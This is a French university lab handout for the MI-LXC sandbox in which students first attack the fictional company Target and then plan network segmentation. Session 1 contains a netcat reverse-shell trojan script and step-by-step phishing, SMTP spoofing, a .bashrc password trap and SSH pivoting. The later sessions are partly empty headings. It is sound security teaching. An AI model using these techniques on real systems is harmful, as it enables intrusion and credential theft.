# Projet en Autonomie - Du flux à la règle ou sécuriser une infra réseau

_Sébastien Mériot_ ([@smeriot](https://twitter.com/smeriot))

Durée: 12 heures

Introduction
============

Ce projet est à réaliser durant les heures planifiées de travail en autonomie. Voici les principales informations à savoir:
- Vous travaillerez par groupe de 5. Il n'y aura qu'un seul groupe de 6 accepté. **Les rendus où le groupe ne satisfait pas à cette condition ne sont pas corrigés.**
- L'énoncé est structuré pour que chaque partie couvre 1 séance de 4h. Il y a donc 3 parties.
- Un petit rendu est attendu pour chaque partie. L'envoi du rendu se fera lors de la dernière séance.
- Ce projet s'appuiera sur la plateforme MI-LXC comme détaillé dans le chapitre suivant.
- L'utilisation de l'IA doit se faire de façon intelligente pour vous permettre de développer votre savoir. Faites preuve d'esprit critique pour éviter les hallucinations (l'énoncé induit en erreur l'IA volontairement). **Lorsque les réponses aux questions s'appuient sur l'IA, indiquez-le et expliquer comment l'IA vous a permis de développer votre raisonnement.**

Accès rapide
============

- [Séance 1](#séance-1---a-lattaque-)
- [Séance 2](#séance-2---le-plan-de-remédiation)
- [Séance 3](#séance-3---la-remédiation)

Préparation de l'environnement
==============================

Comme indiqué, les TPs et ce projet se dérouleront en se basant sur l'environnement [MI-LXC](https://github.com/flesueur/mi-lxc).

Pour préparer votre environnement, vous allez avoir besoin de:
- [Virtual Box](https://www.virtualbox.org/wiki/Downloads)
- La VM MI-LXC pré-configurée disponible [ici](https://flesueur.irisa.fr/mi-lxc/images/milxc-debian-amd64-1.4.2.ova)

Une fois le fichier `OVA` téléchargé, ouvrez `Virtual Box`, puis dans le menu `Fichier`, sélectionnez `Importer un appareil virtuel`. Choisissez le fichier `OVA` et patientez quelques minutes le temps de la création de la machine virtuelle.

Avant de lancer la VM, en fonction de votre configuration, il est peut-être nécessaire de diminuer la RAM allouée. Par défaut, la VM a 3Go : si vous avez 4Go sur votre machine physique, il vaut mieux diminuer à 2Go, voire 1.5Go pour la VM (la VM devrait fonctionner de manière correcte toujours).

L'infrastructure déployée simule plusieurs postes dont un SI d'entreprise (firewall, DMZ, intranet, authentification centralisée, serveur de fichiers, quelques postes de travail interne de l'entreprise _Target_), une machine d'attaquant et quelques autres servant à l'intégration de l'ensemble. Nous ne rentrerons pas dans le détail pour le moment de l'intégralité de l'architecture réseau.

> Pour les curieux, le code de MI-LXC, qui sert à générer cette VM automatiquement, est disponible avec une procédure d'installation documentée [ici](https://github.com/flesueur/mi-lxc)

Vous devez vous connecter à la VM en root/root. MI-LXC est déjà installé et l'infrastructure déployée, il faut avec un terminal aller dans le dossier `/root/mi-lxc`. Pour démarrer l'infrastructure, tapez `./mi-lxc.py start` ou `snster start` (en fonction de la version de la VM utilisée). Une fois l'environnement démarré, vous pouvez commencer le projet !

> Dans la VM et sur les machines MI-LXC, vous pouvez installer des logiciels supplémentaires. Par défaut, vous avez mousepad pour éditer des fichiers de manière graphique. La VM peut être affichée en plein écran. Si cela ne fonctionne pas, il faut parfois changer la taille de fenêtre manuellement, en tirant dans l'angle inférieur droit, pour que VirtualBox détecte que le redimensionnement automatique est disponible. Il y a une case adéquate (taille d'écran automatique) dans le menu écran qui doit être cochée. Si rien ne marche, c'est parfois en redémarrant la VM que cela peut se déclencher. Mais il *faut* la VM en plein écran.

Cheat sheet
===========

Voici un petit résumé des commandes dont vous aurez besoin (si vous utilisez l'environnement en version 2.x, remplacez la commande `./mi-lxc.py` par `snster`):

| Commande | Description | Utilisation |
| -------- | ----------- | ----------- |
| print    | Génère la cartographie du réseau | ./mi-lxc.py print |
| attach   | Permet d'avoir un shell sur une machine | ./mi-lxc.py attach root@target-commercial |
| display  | Lance un serveur X sur la machine cible | ./mi-lxc.py display target-commercial |
| start    | Lance la construction du bac à sable    | ./mi-lxc.py start |
| stop     | Eteint la plateforme pédagogique        | ./mi-lxc.py stop |
| renet    | Redéploie le réseau à partir des fichiers json | ./mi-lxc.py stop && ./mi-lxc.py renet |

Rappel: Vous devez être dans le répertoire `mi-lxc` pour exécuter ces commandes.


Séance 1 - A l'attaque !
========================

Pour débuter ce projet, nous allons littéralement passer à l'attaque en simulant une attaque informatique à l'encontre de la société _Target_. Notre cible sera de dérober la base clients.

Vous travaillerez exclusivement sur la machine du hacker `isp-a-hacker`. Vous devrez réaliser les étapes suivantes :
* Manipulation du commercial pour lui faire installer un cheval de troie reçu par e-mail
* Utilisation du cheval de Troie pour scanner le réseau interne
* Pivot vers la machine hébergeant les données ciblées
* Transfert puis suppression des données comptables et de la base clients
* Profit $$$

Le fil proposé ne couvre bien sûr pas l'ensemble des possibilités mais vise à montrer la diversité des moyens qu'un attaquant peut mettre en œuvre.

Préparation du cheval de Troie
------------------------------

Pour contrôler la machine du commercial, nous allons créer puis transmettre un cheval de Troie. Notre but est d'obtenir un shell sur la machine du commercial afin de l'utiliser comme pivot. Cependant, comme le firewall n'autorise pas les connexions vers l'intérieur de l'entreprise, nous allons plus spécifiquement envoyer un reverse-shell : c'est la machine du commercial qui initiera la connexion vers la machine du hacker.

Le code exemple suivant est disponible sur la machine du hacker (`/home/debian/tp/intrusion/trojan.sh`) :
```
#!/bin/bash
while [ 1 ]; do
	/bin/nc <IP Hacker> <Port Hacker> -q0 -e /bin/bash;
	sleep 1;
done
```

* Étudiez ce petit script, son fonctionnement, le programme nc (netcat). Pourquoi y a-t-il une boucle infinie ?
* Configurez et manipulez ce script en local pour ouvrir un reverse-shell avec vous-mêmes.

Corruption de la machine du commercial
--------------------------------------

> Une personne de votre groupe devra se mettre dans la peau du commercial. Nul besoin de cravatte, vous devrez uniquement afficher la machine target-commercial en tant que commercial via la commande `./mi-lxc.py display commercial@target-commercial`, puis suivre les instructions du mail. Mais si vous avez un doute, vous pouvez très bien supprimer le mail !

Vous devez maintenant amener le commercial à exécuter votre cheval de Troie sur sa machine. Vous devez faire attention à envoyer un mail crédible, social-engineering, qui pousse le commercial à suivre les instructions afin qu'il exécute la pièce-jointe. Notamment, pensez à faire du SMTP spoofing en changeant votre identité d'expéditeur. Dans un cas réel, il suffirait qu'un seul employé installe le cheval de Troie pour que l'attaque fonctionne. Mais avant cela, il faudra convaincre le commercial de vous communiquer son adresse mail !

> Le spoofing est très facile et malheureusement redoutable. De nombreuses initiatives ont émergés pour tenter de trouver une solution technique pour empêcher ce phénomène. Le mécanisme le plus connu est [SPF](https://proton.me/blog/what-is-sender-policy-framework-spf) (_Sender Policy Framework_) qui permet de s'assurer qu'un mail est envoyé depuis une IP qui est autorisée à utiliser ce nom de domaine. Ce mécanisme est souvent utilisé en association avec [DKIM](https://proton.me/blog/what-is-dkim) (_Domain Keys Identified Mail_) et [DMARC](https://proton.me/blog/what-is-dmarc) (_Domain-based Message Authentication, Reporting and Conformance_). Nous n'entrerons pas dans les détails car une séance entière pourrait y être dédiée.

* Décrivez comment vous avez obtenu l'adresse mail du commercial, comment vous l'avez convaincu de vous la donner.
* Réalisez une capture d'écran de votre oeuvre à annexer dans votre rapport.

Scan du réseau interne
----------------------

Votre netcat vient de recevoir une connexion de la machine du commercial. Wotre reverse-shell a été exécuté ! Votre victime ne se doute de rien, et vous allez pouvoir passer à la prochaine étape du plan.

Il vous faut maintenant explorer le réseau pour trouver votre cible. Le programme `nmap` est un scanner réseau, installé sur la machine du hacker mais bien sûr pas du commercial. Il faut donc le transférer pour l'exécuter depuis la machine du commercial. Un serveur web est installé sur la machine du hacker et `nmap` est disponible dans le dossier `/usr/bin`. Le dossier `/var/www/html` du hacker est partagé par un serveur web, le programme en ligne de commande `wget` peut être utilisé côté commercial pour télécharger depuis ce dossier.

* Utilisez maintenant nmap sur la machine du commercial pour explorer le réseau interne : `./nmap <adresse de réseau/masque>`. Dessinez un plan de réseau, les services ouverts, les logiciels utilisés, les sites accessibles, les contenus des index des sites web (accessibles avec wget ou curl). Soyez pertinent dans les adresses IP scannées, le scan est assez long.

> Pour connaître l'IP de la machine commercial : `/sbin/ifconfig`, utilisable en non-root pour la consultation des paramètres. Vous verrez que c'est un /16, la partie intéressante est au début de ce /16 : comme le scan est long, scannez plutôt les premiers /24.

* Réalisez un diagramme modélisant les flux réseaux qui interviennent lorsque vous téléchargez `nmap` puis lorsque vous l'utilisez.
* Faites un plan du réseau de l'entreprise _Target_ suite aux résultats de `nmap`.

Récupération d'un mot de passe valide
-------------------------------------

Il serait tout à fait possible de récupérer le mot de passe du commercial sur sa machine, soit (1) à partir de l'[analyse de son profil ClawsMail par exemple](https://github.com/AlessandroZ/LaZagne), soit (2) en ajoutant un piège à son `.bashrc` lui demandant de retaper son mot de passe.

Si vous avez un peu de temps et que vous voulez utiliser un outil couramment utilisé en red team (mais malheureusement aussi par certains attaquants), partez sur la solution 1.
Sinon, implémentez la solution 2 comme suit:
- À l'aide de votre reverse-shell, vous ne pouvez pas éditer un fichier avec `nano` ou `vim`. Vous devez donc récupérer le `.bashrc` existant.
- Modifiez le `.bashrc` via la machine du hacker afin d'y ajouter un prompt demandant de resaisir le mot de passe. Enregistrer la saisie dans un endroit discret.
- Lorsque votre `.bashrc` malveillant est prêt, transférez le sur la machine du commercial en utilisant le serveur web comme vu précédemment avec `nmap`.
- Au tour du commercial d'ouvrir un terminal et de se prêter au jeu.
- Récupérer les identifiants saisis là où vous les avez enregistrés.
- Pour plus de discrétion, vous pouvez remettre le `.bashrc` dans son état d'origine.

* Faire une capture d'écran de votre script, du commercial qui saisit son mdp, et de la récupération du mdp. Pour ceux qui ont choisit la solution 1, une capture d'écran de la récupération du mot de passe est suffisante.

Accès à la machine cible
------------------------

Pivotez vers la machine hébergeant les données ciblées. Pour faire du SSH, vous aurez besoin d'utiliser [sshpass](https://srvfail.com/how-to-provide-ssh-password-inside-a-script-or-oneliner/) (disponible sur la machine du commercial). Vous pouvez ensuite utiliser la commande `find` avec les bons arguments pour trouver, sur cette machine cible, les fichiers sur lesquels vous pourriez avoir des droits en écriture.

* Faites une petite capture d'écran de l'emplacement de la base clients.

Conclusion
----------

Nous avons mis en oeuvre une petite attaque, certes simpliste, mais qui permet d'avoir une première approche d'une chaîne d'attaque et de la préparation amont nécessaire pour dérouler un scénario d'attaque. Ce scénario va nous servir de base afin de pouvoir renforcer la sécurité du réseau de l'entreprise _Target_ en mettant en oeuvre des mécanismes élémentaires de durcissement et de réduction de l'exposition.

* Afin de conclure cette séance, ajouter dans votre rapport ce que vous avez appris durant ces 4h.

Ouverture
---------

* [Retour de l'ANSSI sur l'incident de TV5Monde au SSTIC 2017](https://www.dailymotion.com/video/x5qs6c0)
* [D'un XLSB à un SI entièrement chiffré en 3 jours](https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/)

Disclaimer
----------=

![Bad guy](https://github.com/flesueur/srs/blob/master/media/bad.jpg?raw=true)

_Attention, lui, il l'a fait pour de vrai..._


Séance 2 - Le plan de remédiation
=================================

Lors de la séance précédente, vous avez déroulé un scénario d'attaque simple. Néanmoins, les techniques abordées (_spear phishing_, _reverse_shell_, _credentials recovery_, découverte du réseau, ...) sont très répandues et ne sont pas très différentes de ce qui peut être employé dans la réalité. Notre objectif à présent va être de corriger le design réseau de l'entreprise _Target_ pour la rendre plus résiliente face à ce type d'attaque.

Bilan de l'attaque
------------------

Avant de commencer, prenons quelques minutes pour nous raffraîchir la mémoire sur l'attaque mise en oeuvre précédemment.
En enfilant la capuche du hacker, vous avez executé une chaîne d'attaque (_killchain_) qui pourrait se résumer ainsi :
1. Accès initial : _spear phishing_ à l'attention du commercial
2. Persistence sur le poste du commercial à l'aide d'un _reverse shell_
3. Reconnaissance du réseau de votre victime à l'aide de _nmap_ que vous avez téléchargé depuis votre propre serveur web
4. Latéralisation sur une machine d'intérêt à l'aide de _ssh_
5. Recherche de la base client et de la comptabilité
6. Et possiblement, exfiltration des fichiers d'intérêt

Le travail de cette séance va avoir pour objectif de rendre cette chaîne d'attaque plus difficile à exécuter et dans l'idéal, impossible. Nous ne pourrons pas agir sur tous les points (nous n'allons pas déplyer d'Antispam par exemple ou d'Antivirus). Mais avec quelques bonnes pratiques d'architecture réseau, nous pouvons déjà faire beaucoup pour compliquer la tâche à un potentiel attaquant.

Avant de rentrer dans le détail, un peu de théorie s'impose.

Zoom sur les protocoles Mail
----------------------------

Pour débuter, nous allons rentrer dans la mécanique de l'envoi d'un mail jusqu'à sa réception afin de comprendre les flux réseau entrant en jeu. Voici les principaux protocoles qui vont nous intéresser et qui sont les plus utilisés aujourd'hui :
- SMTP : Simple Mail Transfer Protocol
- IMAP : Internet Message Access Protocol

* Prenez quelques instants pour récapituler sous forme de tableau à quoi sert chacun de ces protocoles, si ces protocoles utilisent TCP ou UDP, le numéro de port usuel utilisé, si la communication se fait de serveur à serveur ou de client à serveur, et toutes infos que vous pensez utiles.

A présent que vous comprenez l'usage de ces deux protocoles, il est intéressant de comprendre comment le commercial a réussi à recevoir votre mail. Et cette fois, nous allons nous intéresser au protocole DNS.

Zoom sur le protocole DNS
-------------------------

De source sûre, vous avez déjà abordé la notion de _DNS_ (_Domain Name Service_). La notion de zone DNS et de champs DNS est clef dans le fonctionnement d'un serveur DNS et je vous invite à vous raffraîchir la mémoire si cela ne vous parle pas.

* Résumez succintement à quoi sert la champ `MX` dans une zone DNS et en quoi cela nous intéresse dans le processus d'envoi de mail.


Zoom sur la DMZ
---------------

La notion de _DMZ_ (ou Zone Démilitarisée en français) est une notion qui vous est peut-être abstraite. Pourtant, c'est une notion clef en réseau et peut-être que sans le savoir, vous en avez déjà configurée une à la maison au travers de règles NAT. Je vous invite à prendre le temps de lire l'[article suivant](https://www.nexa.fr/blog/dmz-quest-ce-que-cest) afin de vous familiariser avec cette notion.

Afin de s'assurer de votre bonne compréhension, prenez le temps de répondre aux questions suivantes afin de vous assurer que la notion est claire dans vos esprits :
* Une DMZ est-elle exposée sur Internet ?
* Une DMZ est-elle exposée sur le LAN ?
* Une DMZ est-elle libre de communiquer avec le LAN ?
* Une DMZ est-elle une zone de confiance ?
* Une DMZ héberge-t-elle les données sensibles de l'entreprise ?

Carthographie de l'infrastructure
---------------------------------

Maintenant que nous avons pris le temps de poser certaines bases, nous pouvons passer à la partie la plus complexe : carthograpgier une infrastructure existante. Comme discuté en cours, la mise en place d'une nouvelle infrastructure passe systématiquement par une phase de conception donnant lieu à différents documents d'architecture forts utiles pour le maintien en condition opérationnel par la suite. Néanmoins, il arrive parfois que ces documents soient absents ou aient été perdus avec le temps pour les infrastructures les plus vieilles. Ce type de situation implique donc de devoir carthographier l'infrastructure existante afin de faire une rétro-documentation. Cette phase est d'autant plus critique que dans le cadre de la mise en place d'une politique de pare-feu, nous devons impérativement être exhaustif sur les flux identifiés pour éviter de couper des flux indispensables au bon fonctionnement des systèmes.

Nous allons exactement nous positionner dans ce scénario. La société _Target_ ne possède aucune documentation de son réseau et nous allons donc devoir la réaliser afin de pouvoir les conseiller au mieux sur la mise en place de mesures de sécurité efficaces.

> Afin d'avoir une vue d'ensemble, vous pouvez utiliser la commande `print` de la plateforme. *Néanmoins, les informations présentées sont dépendantes de votre résolution d'écran et les adresses IPs ne sont pas forcément placées au bon endroit.* Je vous conseille donc très fortement d'accéder à l'infrastructure directement.

* Récapitulez sous forme de tableau le plan d'adressage du réseau. Indiquez, pour chaque machine, l'adresse IPv4, IPv6 ainsi que son adresse MAC.

Pour rappel, le réseau de l'entreprise est composé de ces différents éléments:

| Machine           | Description |
| :-------:         | ----------- |
| target-router     | Routeur de bordure |
| target-admin      | Ordinateur de l'administrateur système. Il doit pouvoir administrer tout le parc avec le protocole `ssh`. |
| target-commercial | Ordinateur du commercial. Il doit pouvoir accéder à l'intranet web. |
| target-dev        | Ordinateur du développeur. Il doit pouvoir mettre à jour l'intranet à l'aide du protocole `ftp`. |
| target-dmz        | Ensemble de services à l'interface entre le SI et le reste du monde. |
| target-ldap       | Authentification centralisée, nécessaire à tous les postes du SI (y compris la DMZ). |
| target-filer      | Partage de fichiers s'appuyant sur `sshfs` qui doit être accessible à tous les postes clients internes. |
| target-intranet   | Applications web internes, non accessibles au reste du monde. |

* Identifiez-vous plusieurs sous-réseaux dans l'architecture actuelle de la société _Target_ ?

Lors de l'attaque, nous avons utilisé l'outil `nmap` afin de pouvoir énumérer les machines sur le réseau. C'est par ailleurs exactement ce qu'un attaquant ferait dans une telle situation pour faire de la reconnaissance. La facilité avec laquelle vous avez réussi à vous latéraliser sur le réseau réside dans un problème essentiel : le réseau de _Target_ est un réseau dit _à plat_. Concrètement, il n'y a aucune segmentation réseau : tous les équipements (poste de travail, serveurs, téléphones, DMZ, ...) sont tous connectés sur le même réseau, peuvent tous communiquer ensemble, sans aucune restriction, et peu importe leur criticié. De ce fait, lorsque vous avez utilisé `nmap`, vous avez pu découvrir en un clin d'oeil tout ce qui était présent sur le réseau, il ne vous restait plus qu'à pivoter sur la machine d'intérêt.
Cette conception réseau - bien que fonctionnelle - ne répond pas aux enjeux de sécurité récents et ce type de conception est à proscrire.

Ségmentation réseau
-------------------

Pour répondre aux enjeux de sécurité, nous allons transformer le réseau de la société _Target_ d'un réseau à plat en un réseau segmenté.

* En vous appuyant sur le plan d'adressage que vous avez documenté précédemment, suggérez une liste de sous-réseaux qui conviendrait pour la société _Target_. Pour chaque sous-réseau, donnez lui un nom et détaillez quelles machines seraient reliées à ce réseau (en mettant le routeur de côté pour le moment). Définissez un sous-réseau IPv4 et IPv6 à chacun d'eux.

* Faites un diagramme de conception du nouveau réseau que vous préconiseriez. Faites apparaître les adresses IPs des différentes interfaces (y compris le routeur cette fois).

Matrice de flux
---------------

Maintenant que vous avez défini la nouvelle architecture réseau, nous allons devoir identifier précisément les flux entre les machines et les documenter afin de réaliser la matrice flux. Cette dernière sera notre support pour la 3ème séance afin d'implémenter cette nouvelle architecture réseau (et peut-être, améliorer la sécurité de la société _Target_).

Pour rappel une matrice de flux permet de documenter les flux provenant d'une source et allant à une destination.

Conclusion
----------


Séance 3 - La remédiation
=========================

Premiers pas avec `iptables`
----------------------------

Implémentation de la ségmentation réseau
----------------------------------------

Implémentation du routage
------------------------

Verdict final - le rejeu
------------------------

Contournement par tunnel
------------------------

Conclusion
----------


